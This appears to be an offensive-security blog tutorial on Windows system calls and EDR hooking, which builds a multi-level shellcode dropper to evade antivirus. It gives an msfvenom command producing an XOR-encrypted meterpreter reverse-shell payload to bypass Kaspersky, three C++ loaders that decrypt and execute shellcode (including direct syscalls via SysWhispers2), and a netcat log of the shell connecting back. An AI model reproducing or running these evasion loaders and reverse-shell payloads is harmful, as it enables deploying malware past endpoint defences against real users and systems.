<h2> Rainbow Six, Going Dark... ü•∑üèº</h2>
<p>
The Windows kernel is a goldmine for red teamers, offensive security developers or software developers. Understanding the key mechanisms that govern this whole world is crucial. <br>One of the must-see concepts we will look at in this article is... System calls ! (aka Syscalls), how they are managed to be triggered by the API call chain, and where they are located. Since we are clearly in the context of cybersecurity and defense evasion, we will also try to implement a multi-level shellcode dropper using different levels of API call abstraction.<br>
Through this article, we will focus on direct system calls, although indirect system calls are more relevant in bypassing today's EDR solutions (we will cover it in a future article).<br>
<br>But before goind deeper, i would like to thank <b>Daniel Feichter alias @VirtualAllocEx</b> (redops.at) & <b>Mantvydas Baranauskas alias @mantvydasb</b> (ired.team) for their incredible work that inspired me to write this article and for their contribution to the cybersecurity community, their websites are among the references listed below.  
                        </p>

                        <p>
Let's begin, here is the journey that follows the invocation of a function, regardless of its nature, at the highest level of abstraction in user mode :
                        </p>
<div style="display: flex; justify-content: center; align-items: center;">
    <img width="100%" src="assets/img/Function Journey (2).png">
</div>
<br>
                        
On Windows, system calls are generated by routines of the native API, specifically the <b>ntdll.dll</b> API, which serves as the lowest common user-mode denominator during the transition to kernel-mode as shown in the graph below. You'll notice the dotted line for the kernelbase transition, because this transition, not always present, has only appeared in recent versions of Windows. Kernelbase was introduced in the latest versions of Windows to improve application portability, this module can handle differences in kernel version and configuration, and offers an additional layer of security by positioning itself before ntdll.dll.<br><br> The code and instructions for ntdll's routines are located within the kernel. <br><br>

<br>
<div style="display: flex; justify-content: center; align-items: center;">
    <img width="100%" src="assets/img/windows_archi.png">
</div>


<br><br>
A sequence of instructions is performed before the syscall is made. This sequence includes, among other things, filling the registers that will later be treated as parameters for the native function being called. The system call is triggered only once everything is set up and ready to be dispatched to the kernel. There is also a crucial step in this process which is filling the EAX register with what is known as the Syscall ID, Syscall number, or System Service Number (SSN). The value of the SSN may vary depending on the operating system version.

The set of operations that aim to transition from user mode to kernel mode is called the <b>Syscall stub</b>. Here's an example:

<br><br>

<div style="display: flex; justify-content: center; align-items: center;">
    <img width="100%" src="assets/img/syscall_ex.png">
</div>

<br>
Here the value passed to the EAX register which is 6, is the Syscall ID.
<br>

<br>
Therefore, the system call is the last step performed in user mode.

When a system call is triggered, it is the KiSystemCall64 routine specific to ntoskrnl.exe that takes control and handles the call. This routine checks the validity of the system call and is responsible for its execution. As part of its process, this routine ensures to query the SSDT. 
<br>
<br>
The System Service Dispatch Table (SSDT) maps a System Service Number (SSN) to the address of a specific routine. For example, SSN 0x254 corresponds to the address of the NtSuspendThread routine, which is exported by ntoskrnl.exe and located at address 0x805CAB5C. This is all we need to know about SSDT, however, it is important to note that the mechanisms governing the SSDT are much more complex. One method employed by EDR solutions is SSDT hooking, we may delve into this topic in a future article. For those interested, <a href="https://resources.infosecinstitute.com/topic/hooking-system-service-dispatch-table-ssdt/"><U>here is an article that explains in detail how SSDT works and how hooks are achieved on it</U></a>. Once the SSDT returns the result to KiSystemCall64, this routine passes it on to the System Service Dispatcher, which is responsible for executing the located routine. So as we said, each Syscall ID or SSN is associated with a specific routine address, the mapping between the SSN and its associated routine differs dependly on the Windows version. Here is a <a href="https://github.com/tinysec/windows-syscall-table/tree/master"><U>precious Github repository</U></a> listing the appropiate content of the SSDT within a given Windows version.
<br><br>
Once the routine has been executed, its result is returned to the calling function through the RIP register proper to each module as shown on the schema below:
<br><br>

<div style="display: flex; justify-content: center; align-items: center;">
    <img width="100%" src="assets/img/call_chain_jumps_and_returns.png">
</div>

<br><br>

<p>There are 3 main types of hooks that EDR and Antivirus perform to dynamically inspect malicious code in the context of the Windows API call chain:
    <ul>
        <li><b style="color: red;">Inline API hooking (user-mode):</b> <b> This is the method we'll be focusing on through this article</b>. It consists of redirecting API calls via an unconditional jump to a routine in the module loaded by the EDR/AV, which will analyze the call's behavior and structure (arguments, context, etc.).</li><br>
        <div style="display: flex; justify-content: center; align-items: center;">
            <img width="100%" src="assets/img/windgb_comparison.png">
        </div>

        <br>
        
        <li><b style="color: red;">Import Address Table (IAT) hooking (user-mode):</b> This method targets the import table in the PE header, which contains the addresses of each module's imports (after the RVA relocation operation). The EDR/AV will overwrite these addresses and replace them with the addresses of its own routines, in order to analyze the calls. However, it's quite easy to detect this type of hooking, as you can simply perform the relocation yourself via the relocation table in the PE header, and see whether the addresses obtained match the addresses contained in the IAT. </li><br>
        <div style="display: flex; justify-content: center; align-items: center;">
            <img width="100%" src="assets/img/IAT hooking.png">
        </div>
        
        <br>

        <li><b style="color: red;">SSDT hooking. (kernel-mode):</b> This method, which takes place at the lowest level, consists in redirecting the addresses of the routines contained in the SSDT table to the EDR's own routines. The EDR actually acts as a rootkit, as it does for hooking the IAT table, injecting its routines either by directly altering the contents of the SSDT, or by modifying kernel system files such as executables or device drivers in order to load these modifications when the OS is launched.</li><br>

<h4>XOR encryption of shellcodes in order to bypass Kaspersky's static analysis</h4>
<p>
    Kaspersky performs a static analysis of the file dump and obviously has no problem recognizing patterns generated by Metasploit, we then find ourselves in this kind of ambiguous situation :

    <div style="display: flex; justify-content: center; align-items: center;">
        <img width="100%" src="assets/img/kaspersky_shellcode_detection.png">
    </div>

</p>
<p>As I'm a bit lazy about converting assembly code into machine code to get my own shellcode, we'll generate XOR-encrypted shellcodes. </p>

<pre class="prettyprint">
    <code>
    msf6 > msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.24.72.69 LPORT=2106 -f c --encrypt xor --encrypt-key yazidou
    </code>
</pre>

<br>

<h3>Classic Shellcode loader</h3>
<p>Here's the code for a simple shellcode loader, which loads the shellcode into memory and then detonates it using the deference operator, the purpose here is to load our code into the .text segment of the process. </p>
<pre>
    <code class="cpp">
#include &lt;iostream&gt;
#include &lt;windows.h&gt;

void xorDecrypt(unsigned char* data, int length, const std::string& key) {
    int keyLength = key.length();
    for (int i = 0; i < length; i++) {
        data[i] = data[i] ^ key[i % keyLength];
    }
}

int main() {

    unsigned char buf[] =
        "\xb6\x85\xef\xb1\x11\x56\x9b\x52\xb...";

    int bufLentgh = sizeof(buf) - 1; // -1 to extract null terminator
    xorDecrypt(buf, bufLentgh, "yazidou");
    void* exec = VirtualAlloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, buf, sizeof(buf));

    ((void(*)())exec)();

    return 0;
}
    </code>
</pre>

<p>API Monitor 64 shows that our program passes through kernel32.dll via VirtualAlloc to trigger KernelBase's NtAllocateVirtualMemory routine. 
    This is the simplest and shortest way to load shellcode, but we'd be quickly limited if Kernel32.dll were to be hooked by an EDR module. 

<div style="display: flex; justify-content: center; align-items: center;">
    <img width="100%" src="assets/img/api_monitor_kernel32_kernelbase.png">
</div>


<p>Let's analyze our program's imports using the tool provided with Visual Studio: dumpbin.exe</p>

<div style="display: flex; justify-content: center; align-items: center;">
    <img width="100%" src="assets/img/dumpbinimports_high.png">
</div>

<br>VirtualAlloc function has been successfully imported by our program and this is what we want to avoid: if this function is hooked, we want to be able to avoid calling it. Let's see how we can do memory allocation without this function, even though it's necessary for the execution of our program.<br>
<br>

<h3>Mid-Level Direct System Calls</h3>
<p>Here, we're going to implement the NtAllocateVirtualMemory routine ourselves: We'll implement the function definitions and cast them with the address we've retrieved from ntdll module.</p>

<p> We previously mentioned that the function causing the issue (by its presence) was VirtualAlloc, and we need to find a way to bypass its call. We observed that it invokes NtAllocateVirtualMemory, so we will ensure to directly call this function. We will also implement NtFreeVirtualMemory (yes, because memory should be freed as well ü•π). </p>

<p>In a first step, we implement the definitions of these functions as follows : </p>

<pre class="cpp">
    <code>
typedef NTSTATUS (WINAPI* PNtAllocateVirtualMemory)(
	HANDLE    ProcessHandle,		
	PVOID* BaseAddress,				
	ULONG_PTR ZeroBits,				
	PSIZE_T   RegionSize,				
        ULONG     AllocationType,
	ULONG     Protect				
);


typedef NTSTATUS(WINAPI* PNtFreeVirtualMemory) (
	HANDLE ProcessHandle,
	PVOID *BaseAddress,
	PSIZE_T RegionSize,
	ULONG FreeType
);
    </code>
</pre>


<p>At this stage, some of these native API's functions <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntfreevirtualmemory"><U>are documented by Microsoft</U></a>, so we can retrieve the definition from it.</p>

<pre>
    <code class="cpp">  
int main() {

	unsigned char buf[] =
		"\xb6\x85\xef\xb1\x11\x56\x9b\x52\xb9\xc8\x18\x5f\xbd\x0c...";

	int bufLentgh = sizeof(buf) - 1; // -1 to extract null terminator
	xorDecrypt(buf, bufLentgh, "ontherockz");
	
	PNtAllocateVirtualMemory NtAllocateVirtualMemory = (PNtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");

	void* exec = NULL;
	SIZE_T size = sizeof(buf);
	NTSTATUS status = NtAllocateVirtualMemory(GetCurrentProcess(), &exec, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	RtlCopyMemory(exec, buf, sizeof(buf));
	
	((void(*)())exec)();

	cout << NtAllocateVirtualMemory << endl;

	PNtFreeVirtualMemory NtFreeVirtualMemory = (PNtFreeVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtFreeVirtualMemory");
	SIZE_T regionSize = 0;
	status = NtFreeVirtualMemory(GetCurrentProcess(), &exec, &regionSize, MEM_RELEASE);

	return 0;
}
    </code>
</pre>

<p>The address pointed by PNtAllocateVirtualMemory corresponds to the address of the routine in the native module ntdll.</p>

<div style="display: flex; justify-content: center; align-items: center;">
    <img width="100%" src="assets/img/NtAllocateVirtualMemoryAddressaaaaaaaaaaaaaaaa.png">
</div>

<p>Our program is executing correctly and attempting to establish a connection with the meterpreter.</p>

<pre class="prettyprint">
    <code>msf6 > nc -lnvp 2106
[*] exec: nc -lnvp 2106

Listening on 0.0.0.0 2106

<b>Connection received on 172.24.64.1 37511</b></code>
</pre>

<p>Let's now verify the API calls.</p>

<div style="display: flex; justify-content: center; align-items: center;">
    <img width="100%" src="assets/img/MidLevelApiCalls.png">
</div>

<p>Let's go, the NtAllocateVirtualMemory function is indeed being called. And we have bypassed the need of VirtualAlloc.</p>

<div style="display: flex; justify-content: center; align-items: center;">
    <img width="100%" src="assets/img/nomorevirtualalloc.png">
</div>

<p>So here is an overview of what we have achieved. A potential hook in kernel32.dll will no longer be an issue as we have managed to directly call the routines in KernelBase.dll.</p>

<div style="display: flex; justify-content: center; align-items: center;">
    <img width="100%" src="assets/img/MediumLevelSyscall.png">

<h3>Low-Level Direct System Calls</h3>

<p>Here, we are going to attempt something quite special. We will try to trigger system calls directly from our program by implementing the routines of ntdll.dll ourselves. In summary, our goal is simply to bypass ntdll.dll, the lowest-level user-mode module, and trigger the syscalls directly. <br>You will see that it is not so easy, and I will encounter some problems with certain protection mechanisms that I did not expect.</p>

<p>
    We mentioned that we would try to implement the routines of ntdll directly into our program, which is not an easy task, but fortunately, people like <a href="https://github.com/jthuraisamy/"><b><U>@jthuraisamy</U></b></a> exist, and this person has created <a href="https://github.com/jthuraisamy/SysWhispers2"><U><b>SysWhispers2</b></U></a>, a tool that generates these routines in order to be used by our program !
</p>

<p>
    For our program needs, we need to generate the following functions:
</p>
<pre class="cpp">
<code>NtAllocateVirtualMemory
NtFreeVirtualMemory
NtWriteVirtualMemory
NtCreateThreadEx
NtWaitForSingleObject
NtClose
</code>
</pre>

<pre>
    <code class="shell">
python syswhispers.py -f NtAllocateVirtualMemory,NtFreeVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx,NtWaitForSingleObject,NtClose -a x64 -l masm --out-file syscalls
    </code>
</pre>

<p>After importing our .asm, .h, and .c files into Visual Studio (refer to the SysWhispers2 documentation for instructions), we can directly use the functions. It's fantastic!</p>

<p>Then we implement our code as follows:</p>

<pre class="cpp">
    <code>
#include &lt;iostream&gt;
#include &lt;Windows.h&gt;
#include &lt;iomanip&gt;
#include "syscalls.h"

using namespace std;

void xorDecrypt(unsigned char* data, int length, const std::string& key) {
    int keyLength = key.length();
    for (int i = 0; i < length; i++) {
        data[i] = data[i] ^ key[i % keyLength];
    }
}


int main() {

    HANDLE currentProcess = GetCurrentProcess();
    ULONG_PTR cookie;
    BOOL isCFGEnabled = FALSE;

    if (GetProcessMitigationPolicy(currentProcess, ProcessControlFlowGuardPolicy, &cookie, sizeof(cookie))) {
        if (cookie > 0) {
            // Control Flow Guard is enabled
            isCFGEnabled = TRUE;
        }
    }

    if (isCFGEnabled) {
        std::cout << "Control Flow Guard is enabled." << std::endl;
    }
    else {
        std::cout << "Control Flow Guard is not enabled." << std::endl;
    }

    cout << "CFG state : " << isCFGEnabled << endl;

    cout << "Hello from Low Level Dropper !" << endl;

    system("pause");

    unsigned char buf[] =
        "\x85\x29\xf9\x8d\x94\x87\xb9\x79\x61\x7a\x28\x35\x2e\x25...";
    int size_of_buf = sizeof(buf);
    xorDecrypt(buf, size_of_buf, "yazidou");

    LPVOID allocationStart = nullptr;
    SIZE_T allocationSize = size_of_buf;
    HANDLE hThread;
    NTSTATUS status;

    // Memory Allocation
    NTSTATUS ntStatus1 = NtAllocateVirtualMemory(GetCurrentProcess(), &allocationStart, 0, (PULONG64)&allocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Copying shell-code into allocated memory
    NTSTATUS ntStatus2 = NtWriteVirtualMemory(GetCurrentProcess(), &allocationStart, buf, sizeof(buf), 0);

    cout << "\nXOR-Decrypted shellcode : ";
    for (size_t i = 0; i < sizeof(buf); i++) {
        cout << hex << setw(2) << setfill('0') << static_cast<int>(buf[i]);
    }
    cout << "\n" << endl;

    // Executing shell-code in memory
    NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), &allocationStart, allocationStart, FALSE, NULL, NULL, NULL, NULL);
    
    if (hThread == NULL) {
        cout << "hThread is NULL";
    }
    else {
        cout << "hThread isn't NULL";
    }

    // Waiting for the end of the thread & closing the handle
    NTSTATUS ntStatus4 = NtWaitForSingleObject(hThread, FALSE, NULL);

    DWORD lastError = GetLastError();            

    // Finishing
    NtClose(hThread);

    return 0;
}
    </code>
</pre>

<p>We then try to execute that code and take a look at the API calls: </p>


<div style="display: flex; justify-content: center; align-items: center;">
    <img width="100%" src="assets/img/LowLevelApiCalls.png">
</div>

<p>
    Fantastic! It is evident that the native functions we implemented ourselves using SysWhispers2 are not visible. This means that we do not interact with ntdll.dll at any point to call sensitive functions, except for NtClose, I don't really know why but that's not a problem since NtClose isn't a critical function.
</p>

<p>
Here's what we have achieved:

<p>Well... I have to admit that i have had a little very mysterious trouble with Windows Control Flow Guard (CFG). And you may encounter the same on certain recent versions of Windows (I am using Windows 11), especially in the context of direct system calls.</p>
<p>Control Flow Guard is a mitigation technology that helps prevent certain types of code execution attacks, such as return-oriented programming (ROP) and call-jumping techniques. It achieves this by adding additional checks and restrictions to the program's control flow.</p>
<p>It is much more difficult for exploits to execute arbitrary code through vulnerabilities such as buffer overflows. CFG extends previous exploit mitigation technologies such as /GS, DEP, and ASLR.</p>
<p>
    While digging into the debugger, I noticed that certain calls are being blocked by an unconditional, non-necessary, troll jump to KERNEL32!guard_dispatch_icall_nop ü•¥üòµ‚Äçüí´üíÄ:
</p>

<p>I have set breakpoints on the following functions:</p>

<pre>
    <code class="cpp">
0:004> bp NtAllocateVirtualMemory
0:004> bp NtWriteVirtualMemory
0:004> bp NtCreateThreadEx
0:004> bp NtWaitForSingleObject
0:004> bp NtClose
    </code>
</pre>


<p>
    This allowed me to see where the error was coming from. The program jumps at the moment of the call to one of the functions we imported with SysWhispers2.
</p>

<pre>
    <code class="">
(4a38.8168): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
KERNEL32!guard_dispatch_icall_nop:
00007ffa`ec753e70 ffe0            jmp     rax {00cce8f0`e48348fc}
    </code>
</pre>

<p> 
I researched KERNEL32!guard_dispatch_icall_nop, and I concluded that this function is not supposed to be blocking.<br>
If the OS does not support CFG, the __guard_dispatch_icall_fptr will point to the _guard_dispatch_icall_nop which is just this instruction set: jmp rax. The RAX address is the function that follows normal execution flow, but here, the jump to rax {00cce8f0`e48348fc} seems to be completely prohibited, which I admit is confusing considering the utility of the guard_dispatch_icall_nop routine üòµ‚Äçüí´.
</p>

<p>I tried forcing it, but it doesn't make any difference. The execution still gets stuck on the same error.</p>

<p>
I decided to check if Control Flow Guard (CFG) is enabled for my program, and I realized that CF Instrumented is enabled.
</p>

<div style="display: flex; justify-content: center; align-items: center;">
    <img width="100%" src="assets/img/cfinsturmented.png">
</div>

<p>Then, I disabled CFG on Visual Studio, hoping that it might resolve the issue.</p>

</div>

<p>Unfortunately, that didn't really work, as now I'm encountering new errors that are much more explicit about the damn Control Flow Guard. </p>
<p>Now I'm getting a <b>FAST_FAIL_GUARD_ICALL_CHECK_FAILURE</b> :</p>


<pre
    <code class="cpp">
WARNING: Continuing a non-continuable exception
(6984.65f0): <b style="color: red">Security check failure or stack buffer overrun</b> - code c0000409 (!!! second chance !!!)
Subcode: 0xa <b>FAST_FAIL_GUARD_ICALL_CHECK_FAILURE</b>
ntdll!LdrpICallHandler+0xf:
00007ffc`12f9e9ff cd29            int     29h
    </code>
</pre>

<div style="display: flex; justify-content: center; align-items: center;">
    <img width="100%" src="assets/img/ilallouemaiscreepasdethreads.png">
</div>

<p>
    FAST_FAIL_GUARD_ICALL_CHECK_FAILURE is a specific error code that indicates a failure in the Control Flow Guard (CFG) Indirect Call checking mechanism. When a program using CFG encounters this error, it means that an indirect function call has violated the CFG protection rules.
</p>

<p>I can understand that Windows CFG takes his job very seriously and strictly prohibits us from loading our shellcode for a mysterious reason. However, what I don't understand is that <b>it is the NtWaitForSingleThread routine that is causing issues in the execution flow</b>.</p>

<p>To better understand what is happening, I will probably take a look at articles that delve into the behavior of CFG <a href="https://connormcgarr.github.io/examining-xfg/"><U>(such as this one ü§î)</U></a>, and it might even become the subject of a future article.</p>

<p>But In summary, we have achieved quite a few interesting things and, most importantly, we have managed to bypass modules and the traditional user-mode call chain, triggering system calls at different levels.</p>
